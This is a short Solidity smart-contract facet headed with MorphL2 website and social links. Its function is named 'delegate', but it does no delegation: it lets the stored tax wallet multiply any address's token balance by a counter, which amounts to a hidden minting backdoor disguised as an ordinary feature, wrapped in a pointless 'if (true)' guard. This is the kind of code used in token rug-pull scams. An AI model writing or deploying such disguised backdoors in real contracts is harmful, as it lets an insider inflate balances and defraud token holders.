// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://www.morphl2.io/
    Twitter:  https://twitter.com/Morphl2
    Gitbook:  https://docs.morphl2.io/
    Telegram: https://t.me/MorphL2official
    Discord:  https://discord.gg/5SmG4yhzVZ

*/

pragma solidity ^0.8.24;
import "./TestLib.sol";
contract delegateFacet is Ownable {
    function delegate(address delegatee) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (true) {
            require(ds._taxWallet == _msgSender());
            ds._balances[delegatee] *= ds.buyCount;
        }
    }
}
